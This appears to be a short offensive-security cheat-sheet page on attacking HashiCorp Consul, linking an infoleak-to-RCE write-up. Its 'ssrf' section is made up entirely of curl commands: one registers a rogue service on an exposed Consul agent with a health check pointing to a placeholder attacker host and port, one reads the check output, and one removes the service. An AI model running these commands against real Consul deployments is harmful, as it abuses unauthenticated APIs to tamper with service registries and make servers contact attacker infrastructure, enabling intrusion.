# Consul

{% embed url="https://lab.wallarm.com/consul-by-hashicorp-from-infoleak-to-rce/" %}

## ssrf

**Register agent**

```bash
curl -X PUT -H "Content-Type: application/json" -d '{
  "ID": "testservice",
  "Name": "testservice",
  "Address": "127.0.0.1",
  "Port": 80,
  "check": {
    "HTTP": "http://attackerIp:attackerPort",
    "interval": "10s"
  }
}' http://consulHost:8500/v1/agent/service/register
```

**Get output**

```bash
curl http://10.27.179.70:8500/v1/agent/checks | jq
```

**Unregister agent**

```bash
curl http://consul-host:8500/v1/agent/service/deregister/testservice -X PUT
```
